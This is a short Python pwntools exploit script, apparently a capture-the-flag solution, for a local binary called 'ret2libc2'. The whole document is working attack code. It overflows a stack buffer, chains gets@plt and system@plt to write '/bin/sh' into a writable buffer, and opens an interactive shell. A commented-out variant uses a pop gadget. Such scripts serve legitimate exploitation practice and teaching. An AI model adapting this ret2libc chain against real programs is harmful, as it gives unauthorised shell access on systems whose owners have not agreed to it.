from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080
#payload = flat( [b'A' * (0x6C + 0x4), gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
payload = flat( [b'A' * (0x6C + 0x4), gets_plt, system_plt, buf2, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()